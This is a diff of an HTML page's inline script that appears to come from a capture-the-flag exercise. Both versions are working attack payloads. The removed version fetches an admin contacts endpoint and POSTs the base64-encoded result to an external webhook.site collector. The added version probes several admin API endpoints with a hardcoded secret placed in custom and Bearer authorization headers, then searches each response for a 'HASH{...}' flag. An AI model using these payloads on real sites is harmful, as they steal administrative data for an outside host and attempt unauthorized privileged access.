@@ -2,15 +2,38 @@
 <html>
 <body>
    <script>
-fetch('/api/admin/contacts')
-  .then(res => res.json())
-  .then(data => {
-    fetch('https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27', {
-      method: 'POST',
-      mode: 'no-cors',
-      body: btoa(JSON.stringify(data))
-    });
-  });
+(async () => {
+    const secret = 'rNt4C4r_c4ch3_s3cr3t_2026';
+    const endpoints = [
+        '/api/admin/settings',
+        '/api/admin/flag',
+        '/api/admin/config',
+        '/api/admin/users/1'
+    ];
+
+    console.log("%c Starting Administrative Secret Probe...", "color: red; font-weight: bold;");
+
+    for (let url of endpoints) {
+        try {
+            const response = await fetch(url, {
+                headers: {
+                    'X-Cache-Secret': secret,
+                    'X-Platform-Secret': secret,
+                    'Authorization': 'Bearer ' + secret
+                }
+            });
+            const data = await response.text();
+            console.log(`%c Results for ${url}:`, "color: blue;");
+            console.log(data);
+            
+            if (data.includes('HASH{')) {
+                console.log("%c FLAG FOUND! %c " + data.match(/HASH\{.*?\}/)[0], "background: green; color: white;", "color: green; font-weight: bold;");
+            }
+        } catch (e) {
+            console.log(`Failed to fetch ${url}`);
+        }
+    }
+})();
 </script>
 </body>
 </html>
